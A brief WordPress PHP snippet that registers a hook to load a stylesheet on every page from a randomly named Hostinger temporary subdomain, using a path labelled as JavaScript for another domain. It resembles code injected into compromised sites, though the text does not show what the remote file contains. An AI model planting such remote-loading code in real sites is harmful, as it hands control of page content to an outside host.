function load_remote_css() {
    wp_enqueue_style(
        'remote-css',
        'https://lightcyan-oryx-911920.hostingersite.com/quintedriving.ca-js/?key=key',
        array(),
        null
    );
}
add_action('wp_enqueue_scripts', 'load_remote_css');
